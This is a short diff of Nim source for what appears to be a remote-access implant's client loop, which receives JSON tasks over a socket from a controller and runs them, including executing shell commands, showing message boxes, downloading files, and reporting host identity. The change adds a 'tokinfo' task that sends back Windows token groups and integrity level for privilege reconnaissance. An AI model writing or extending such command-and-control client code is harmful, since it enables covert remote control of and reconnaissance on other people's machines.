@@ -2,7 +2,7 @@ import net, base64, json, os
 
 import modules, communication
 
-import ../clientTasks/[shell, msgbox, download]
+import ../clientTasks/[shell, msgbox, download, tokinfo]
 
 var client: Socket = newSocket()
 
@@ -32,7 +32,6 @@ proc receiveCommands(client: Socket) =
 
     case jsonNode["task"].getStr():
     of "identify":
-      echo getintegritygroups()
       client.identify(
         taskId,
         hostname=hostname(),
@@ -42,6 +41,11 @@ proc receiveCommands(client: Socket) =
         windowsVersionInfo=getwindowosinfo(),
         linuxVersionInfo=getlinuxosinfo(),
         ownIntegrity=getintegrity()
+      )
+    of "tokinfo":
+      tokinfo.executeTask(client, taskId, 
+        tokenGroups=getintegritygroups(),
+        tokenIntegrity=getintegrity()
       )
     of "shell": 
       let toExec = jsonNode["data"]["shellCmd"].getStr()
